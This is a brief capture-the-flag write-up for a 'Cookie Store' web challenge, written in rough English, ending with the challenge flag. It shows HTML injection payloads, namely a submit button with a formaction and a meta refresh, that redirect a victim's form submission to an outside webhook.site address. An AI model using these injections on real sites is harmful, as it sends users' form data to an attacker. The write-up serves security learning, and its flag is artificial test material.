# Cookie Store

I started with reviewing code this application and undestending how it works. The most important is js whos click button input[type=”submit”] this js gets FIRST element with that tag. Lets hack….

starting with

```sql
<input type="submit">
```

but this html destroy page but with:

```sql
<input type='submit'>
```

it works but how redirect request to my webhook

```sql
<input type='submit' formaction='https://webhook.site/8fc412cf-ca22-436f-98b5-388322118ecf'>
```

from other writeup technics

```sql
<meta http-equiv='refresh' content='0; url=https://webhook.site/8fc412cf-ca22-436f-98b5-388322118ecf'>
```

<img src="screenshots/cookie_store.png">

flag: `TFCCTF{144ab0e4c358b00b1258f2aea2250b21}`
